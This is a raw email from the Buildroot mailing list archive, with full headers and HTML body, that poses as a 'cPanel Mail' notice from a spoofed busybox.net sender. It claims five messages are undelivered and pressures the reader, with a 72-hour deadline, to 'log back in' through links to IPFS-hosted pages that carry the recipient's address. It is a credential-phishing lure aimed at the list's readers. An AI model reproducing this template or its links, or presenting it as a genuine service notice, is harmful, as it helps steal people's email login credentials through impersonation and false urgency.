Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 82DBACD11DD
	for <buildroot@archiver.kernel.org>; Tue, 26 Mar 2024 16:25:31 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp2.osuosl.org (Postfix) with ESMTP id 2A58840108;
	Tue, 26 Mar 2024 16:25:31 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp2.osuosl.org ([127.0.0.1])
 by localhost (smtp2.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id xbWdacFv1rmB; Tue, 26 Mar 2024 16:25:30 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 3493540385
Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
	by smtp2.osuosl.org (Postfix) with ESMTP id 3493540385;
	Tue, 26 Mar 2024 16:25:30 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by ash.osuosl.org (Postfix) with ESMTP id 457BF1BF487
 for <buildroot@lists.busybox.net>; Tue, 26 Mar 2024 16:25:28 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id 328C08190B
 for <buildroot@lists.busybox.net>; Tue, 26 Mar 2024 16:25:28 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id 9f6j8XfGzw5c for <buildroot@lists.busybox.net>;
 Tue, 26 Mar 2024 16:25:27 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=141.98.10.132;
 helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org B1FAE81815
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org B1FAE81815
Received: from busybox.net (unknown [141.98.10.132])
 by smtp1.osuosl.org (Postfix) with ESMTP id B1FAE81815
 for <buildroot@busybox.net>; Tue, 26 Mar 2024 16:25:26 +0000 (UTC)
From: cPanel Mail <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 26 Mar 2024 17:25:25 +0100
Message-ID: <20240326172525.AE8343F110FEE970@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] Review pending messages (s)
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============3886026834278431690=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============3886026834278431690==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body style=3D"margin: 0.4em;">
<p><br></p>
<div style=3D'color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; =
letter-spacing: normal; font-family: Calibri, Helvetica, sans-serif, EmojiF=
ont, "Apple Color Emoji", "Segoe UI Emoji", NotoColorEmoji, "Segoe UI Symbo=
l", "Android Emoji", EmojiSymbols; font-size: 16px; font-style: normal; fon=
t-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: =
2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-=
stroke-width: 0px; text-decoration-thickness:=20
initial; text-decoration-style: initial; text-decoration-color: initial;'><=
div><p style=3D"margin-top: 0px; margin-bottom: 0px;"></p>
<table style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: n=
one; letter-spacing: normal; font-family: Roboto, sans-serif; font-size: 14=
px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: n=
ormal; border-collapse: collapse; max-width: 487.5pt; orphans: 2; widows: 2=
; background-color: rgb(255, 255, 255);" border=3D"1" cellspacing=3D"0" cel=
lpadding=3D"0"><tbody><tr>
<td style=3D"border-width: 1pt 1pt medium; border-style: solid solid none; =
padding: 0in 46.65pt; border-top-color: rgb(221, 221, 221); border-right-co=
lor: rgb(221, 221, 221);"><p style=3D"margin: 0px 0in 0in 27.35pt;"><span s=
tyle=3D"font-weight: bolder;"><span style=3D"color: rgb(255, 102, 0); font-=
family: Tahoma, sans-serif; font-size: 36pt;">cPanel</span></span><span sty=
le=3D"color: rgb(255, 102, 0); font-family: Verdana, sans-serif; font-size:=
 36pt;">&nbsp;</span>
<span style=3D'color: rgb(255, 102, 0); font-family: "Microsoft YaHei", san=
s-serif; font-size: 36pt;'></span><span style=3D'color: black; font-family:=
 "Microsoft YaHei", sans-serif; font-size: 12pt;'></span></p><p style=3D"ma=
rgin: 0in; line-height: 18pt;"><span style=3D'color: black; font-family: "M=
icrosoft YaHei", sans-serif; font-size: 12pt;'></span>&nbsp;</p><p style=3D=
"margin: 0in; line-height: 18pt;"><span style=3D"font-weight: bolder;">
<span style=3D"color: rgb(102, 102, 102); font-family: Verdana, sans-serif;=
 font-size: 10pt;">Dear contact</span></span></p><p style=3D"margin: 0in; l=
ine-height: 18pt;"><span style=3D"font-weight: bolder;"><span style=3D"colo=
r: rgb(102, 102, 102); font-family: Verdana, sans-serif; font-size: 10pt;">=
There are&nbsp;</span></span><span style=3D"font-weight: bolder;"><span sty=
le=3D"color: rgb(102, 102, 102); font-family: Verdana, sans-serif; font-siz=
e: 10pt;">(5</span></span><span>&nbsp;</span><span>
&nbsp;</span><span style=3D"font-weight: bolder;">&nbsp;<span style=3D"colo=
r: rgb(102, 102, 102); font-family: Verdana, sans-serif; font-size: 10pt;">=
) new messages were sent to you, but they were not&nbsp;</span></span><span=
 style=3D"font-weight: bolder;"><span style=3D"color: rgb(102, 102, 102); f=
ont-family: Verdana, sans-serif; font-size: 10pt;">successfully</span></spa=
n><span>&nbsp;</span><span style=3D"font-weight: bolder;"><span>&nbsp;</spa=
n>
<span style=3D"color: rgb(102, 102, 102); font-family: Verdana, sans-serif;=
 font-size: 10pt;">&nbsp;</span></span><span style=3D"font-weight: bolder;"=
><span style=3D"color: rgb(102, 102, 102); font-family: Verdana, sans-serif=
; font-size: 10pt;">delivered</span></span><span style=3D"font-weight: bold=
er;"><span>&nbsp;</span><span style=3D"color: rgb(102, 102, 102); font-fami=
ly: Verdana, sans-serif; font-size: 10pt;"><span>&nbsp;</span>&nbsp;to your=
 mailbox</span></span><span style=3D"font-weight: bolder;">
<span style=3D"color: rgb(102, 102, 102); font-family: Verdana, sans-serif;=
 font-size: 10pt;">. The reason is&nbsp;</span></span><span style=3D"font-w=
eight: bolder;"><span>&nbsp;</span><span style=3D"color: rgb(102, 102, 102)=
; font-family: Verdana, sans-serif; font-size: 10pt;">because&nbsp;</span><=
/span><span style=3D"font-weight: bolder;"><span>&nbsp;</span><span style=
=3D"color: rgb(255, 102, 0); font-family: Verdana, sans-serif; font-size: 1=
0pt;">
<a href=3D"https://cloudflare-ipfs.com/ipfs/bafkreifr4jowxml3cshivpo3raub4d=
pp5lt4pnhbelxdnvm6g5qh4klafi?filename=3DInbox.html#buildroot@busybox.net">c=
Panel</a></span></span><span style=3D"font-weight: bolder;"><span>&nbsp;</s=
pan><span style=3D"color: rgb(102, 102, 102); font-family: Verdana, sans-se=
rif; font-size: 10pt;">&nbsp;has a new&nbsp;</span></span><span style=3D"fo=
nt-weight: bolder;"><span>&nbsp;</span><span style=3D"color: rgb(102, 102, =
102); font-family: Verdana, sans-serif; font-size: 10pt;">
regulation</span></span><span style=3D"font-weight: bolder;"><span>&nbsp;</=
span><span style=3D"color: rgb(102, 102, 102); font-family: Verdana, sans-s=
erif; font-size: 10pt;">&nbsp;policy that affects a portion of incoming mes=
sage</span></span><span style=3D"font-weight: bolder;"><span>&nbsp;</span><=
span style=3D"color: rgb(102, 102, 102); font-family: Verdana, sans-serif; =
font-size: 10pt;">s</span></span><span style=3D"font-weight: bolder;"><span=
>&nbsp;</span>
&nbsp;<span style=3D"color: rgb(102, 102, 102); font-family: Verdana, sans-=
serif; font-size: 10pt;">in&nbsp;</span></span><span style=3D"font-weight: =
bolder;"><span style=3D"color: rgb(102, 102, 102); font-family: Verdana, sa=
ns-serif; font-size: 10pt;"><span>&nbsp;</span>your email account</span></s=
pan><span style=3D"font-weight: bolder;"><span>&nbsp;</span><span style=3D"=
color: rgb(102, 102, 102); font-family: Verdana, sans-serif; font-size: 10p=
t;">.<br><br></span></span>
<span style=3D"font-weight: bolder;"><span style=3D"color: rgb(102, 102, 10=
2); font-family: Verdana, sans-serif; font-size: 10pt;">You should&nbsp;</s=
pan></span><span>&nbsp;</span><span style=3D"font-weight: bolder;"><span>&n=
bsp;</span><span style=3D"color: rgb(102, 102, 102); font-family: Verdana, =
sans-serif; font-size: 10pt;">retrieve&nbsp;</span></span><span style=3D"fo=
nt-weight: bolder;"><span style=3D"color: rgb(102, 102, 102); font-family: =
Verdana, sans-serif; font-size: 10pt;">
the (5) pending&nbsp;</span></span><span style=3D"font-weight: bolder;"><sp=
an>&nbsp;</span><span>&nbsp;</span><span style=3D"color: rgb(102, 102, 102)=
; font-family: Verdana, sans-serif; font-size: 10pt;">messages in a timely =
manner to avoid rejection. The system takes&nbsp;</span></span><span style=
=3D"font-weight: bolder;"><span style=3D"color: olive; font-family: Verdana=
, sans-serif; font-size: 10pt;">72</span></span><span style=3D"font-weight:=
 bolder;"><span>&nbsp;</span><span>&nbsp;</span>
<span style=3D"color: rgb(102, 102, 102); font-family: Verdana, sans-serif;=
 font-size: 10pt;">&nbsp;hours to restore the emails. OR&nbsp; &nbsp;</span=
></span><span style=3D'color: black; font-family: "Microsoft YaHei", sans-s=
erif; font-size: 12pt;'></span></p><p style=3D"margin: 0in; line-height: 18=
pt;"><span><em><span style=3D"background: rgb(0, 153, 255); color: white; f=
ont-family: Verdana, sans-serif; font-size: 12pt;">
<a style=3D"color: rgb(0, 172, 255); text-decoration: none; background-colo=
r: transparent;" href=3D"https://cloudflare-ipfs.com/ipfs/bafkreigwc373y7yc=
eu26vz77ylvqslg2pkacl3tr6rbrk4dr4rbua3ywjm?#buildroot@busybox.net" target=
=3D"_blank" rel=3D"noreferrer"><span style=3D"color: white;">&gt;&gt;&gt; P=
lease log back in here to retrieve your messages</span></a></span></em></sp=
an><span style=3D'color: black; font-family: "Microsoft YaHei", sans-serif;=
 font-size: 12pt;'></span></p>
<p style=3D"margin: 0in; line-height: 18pt;"><span><span style=3D"font-weig=
ht: bolder;"><span style=3D"color: rgb(83, 83, 83); font-family: Verdana, s=
ans-serif; font-size: 10pt;">If the messages are not retrieved in time, fur=
ther incoming emails will be rejected.</span></span></span><span style=3D"f=
ont-weight: bolder;"><span style=3D"color: rgb(102, 102, 102); font-family:=
 Verdana, sans-serif; font-size: 10pt;"></span></span>
<span style=3D"color: rgb(102, 102, 102); font-family: Verdana, sans-serif;=
 font-size: 10pt;"></span></p><p style=3D"margin: 0in; line-height: 18pt;">=
<span style=3D"font-weight: bolder;"><span style=3D"color: rgb(102, 102, 10=
2); font-family: Verdana, sans-serif; font-size: 10pt;">Thanks,<br></span><=
/span><span style=3D"font-weight: bolder;"><em><span style=3D"color: rgb(83=
, 83, 83); font-family: Verdana, sans-serif; font-size: 10pt;">cPanel</span=
></em></span><span style=3D"font-weight: bolder;">
<span style=3D"color: rgb(83, 83, 83); font-family: Verdana, sans-serif; fo=
nt-size: 10pt;">&nbsp;Mailbox Housekeeper!</span></span><span style=3D'colo=
r: black; font-family: "Microsoft YaHei", sans-serif; font-size: 12pt;'></s=
pan></p><p style=3D"margin: 0in; text-align: justify; line-height: 18pt;"><=
span style=3D'color: black; font-family: "Microsoft YaHei", sans-serif; fon=
t-size: 12pt;'></span>&nbsp;</p><p style=3D"margin: 0in; text-align: justif=
y; line-height: 18pt;">
<span style=3D'color: black; font-family: "Microsoft YaHei", sans-serif; fo=
nt-size: 12pt;'></span>&nbsp;</p></td></tr><tr><td style=3D"border-width: m=
edium 1pt 1pt; border-style: none solid solid; padding: 0in 46.65pt;"><p al=
ign=3D"center" style=3D"margin: 0in; text-align: center; line-height: 18pt;=
"><span style=3D'color: black; font-family: "Segoe UI", sans-serif; font-si=
ze: 10pt;'>&copy;2024 cPanel, L.L.C.</span></p></td></tr></tbody></table></=
div></div><p>
</p>


</body></html>

--===============3886026834278431690==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============3886026834278431690==--
